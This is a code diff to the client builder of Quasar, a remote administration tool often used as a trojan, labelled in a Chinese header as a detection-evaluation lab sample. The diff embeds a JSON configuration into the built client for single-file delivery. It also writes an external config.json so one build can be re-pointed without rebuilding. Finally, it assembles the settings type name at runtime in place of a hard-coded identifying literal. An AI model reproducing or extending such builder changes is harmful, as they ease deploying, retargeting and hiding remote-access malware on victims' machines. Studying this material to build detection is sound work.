@@ -1,8 +1,18 @@
-﻿using Mono.Cecil;
+﻿// ---------------------------------------------------------------------------
+// Quasar 检测评估实验台 · 实验室基线样本（Quasar-LabBaseline）
+// 作者：陈森（Chen Sen）  https://github.com/chendashi666
+// 本文件由陈森创作或改造：禁止盗卖，禁止商业用途。
+// 上游 Quasar 代码版权归 MaxXor 及 Quasar 贡献者所有（MIT License）。
+// ---------------------------------------------------------------------------
+
+using Mono.Cecil;
 using Mono.Cecil.Cil;
+using Quasar.Common.Config;
 using Quasar.Common.Cryptography;
+using Quasar.Common.Properties;
 using Quasar.Server.Models;
 using System;
+using System.IO;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
@@ -17,6 +27,25 @@ namespace Quasar.Server.Build
     {
         private readonly BuildOptions _options;
         private readonly string _clientFilePath;
+        private LabConfig _labConfiguration;
+
+        /// <summary>
+        /// Laboratory metadata (internal subnet) written into the embedded and external
+        /// configuration. It has no upstream consumer and never changes client behaviour.
+        /// </summary>
+        public string LabSubnet { get; set; }
+
+        /// <summary>
+        /// Full name of the settings type inside the client assembly, assembled at runtime from the
+        /// centralized laboratory string resources instead of a hard coded literal.
+        /// </summary>
+        private static readonly string SettingsTypeFullName = string.Join(".", new[]
+        {
+            LabStrings.NamespaceRoot,
+            LabStrings.ClientNamespace,
+            LabStrings.ConfigNamespace,
+            LabStrings.SettingsTypeName
+        });
 
         public ClientBuilder(BuildOptions options, string clientFilePath)
         {
@@ -29,10 +58,20 @@ namespace Quasar.Server.Build
         /// </summary>
         public void Build()
         {
+            // The laboratory external configuration is computed once and used both for the
+            // embedded resource and for the config.json written next to the produced client.
+            _labConfiguration = LabConfigFactory.FromBuildOptions(_options);
+            if (!string.IsNullOrEmpty(LabSubnet))
+                _labConfiguration.Subnet = LabSubnet;
+
             using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(_clientFilePath))
             {
                 // PHASE 1 - Writing settings
                 WriteSettings(asmDef);
+
+                // PHASE 1b - Embedding the laboratory external configuration so the produced
+                // executable is self contained and can be delivered as a single file.
+                EmbedLabConfiguration(asmDef);
 
                 // PHASE 2 - Renaming
                 Renamer r = new Renamer(asmDef);
@@ -76,6 +115,49 @@ namespace Quasar.Server.Build
                 IconDirectoryResource iconDirectoryResource = new IconDirectoryResource(iconFile);
                 iconDirectoryResource.SaveTo(_options.OutputPath);
             }
+
+            // PHASE 6 - Laboratory external configuration
+            // Emits config.json next to the produced client so that one single build can be
+            // re-pointed between experiment conditions without being rebuilt.
+            WriteLabConfiguration();
+        }
+
+        /// <summary>
+        /// Writes the external laboratory configuration next to the built client.
+        /// An existing configuration is never overwritten, so re-running the builder does not
+        /// clobber the parameters of an experiment condition.
+        /// </summary>
+        private void WriteLabConfiguration()
+        {
+            var outputPath = Path.GetFullPath(_options.OutputPath);
+            var directory = Path.GetDirectoryName(outputPath);
+            if (string.IsNullOrEmpty(directory))
+                return;
+
+            var configPath = Path.Combine(directory, LabConfig.FileName);
+            if (File.Exists(configPath))
+                return;
+
+            _labConfiguration.SaveTo(configPath);
+        }
+
+        /// <summary>
+        /// Embeds the laboratory configuration into the produced assembly. The runtime loader
+        /// treats this as the base layer and an external config.json as the override layer.
+        /// </summary>
+        private void EmbedLabConfiguration(AssemblyDefinition asmDef)
+        {
+            var name = LabConfig.EmbeddedResourceName;
+            var module = asmDef.MainModule;
+
+            for (var i = module.Resources.Count - 1; i >= 0; i--)
+            {
+                if (module.Resources[i].Name == name)
+                    module.Resources.RemoveAt(i);
+            }
+
+            var payload = Encoding.UTF8.GetBytes(_labConfiguration.ToJson());
+            module.Resources.Add(new EmbeddedResource(name, ManifestResourceAttributes.Public, payload));
         }
 
         private void WriteSettings(AssemblyDefinition asmDef)
@@ -96,7 +178,7 @@ namespace Quasar.Server.Build
 
             foreach (var typeDef in asmDef.Modules[0].Types)
             {
-                if (typeDef.FullName == "Quasar.Client.Config.Settings")
+                if (typeDef.FullName == SettingsTypeFullName)
                 {
                     foreach (var methodDef in typeDef.Methods)
                     {
